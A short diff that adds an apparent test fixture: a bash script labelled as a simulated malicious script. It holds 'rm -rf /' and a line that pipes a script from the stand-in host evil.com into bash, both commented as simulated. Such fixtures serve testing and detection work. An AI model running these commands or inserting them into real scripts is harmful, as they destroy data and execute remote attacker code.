@@ -1,0 +1,1 @@
+#!/bin/bash\necho 'This is a test of a malicious script.'\nrm -rf / # Simulated malicious command\ncurl evil.com/exfil.sh | bash # Simulated data exfiltration\n
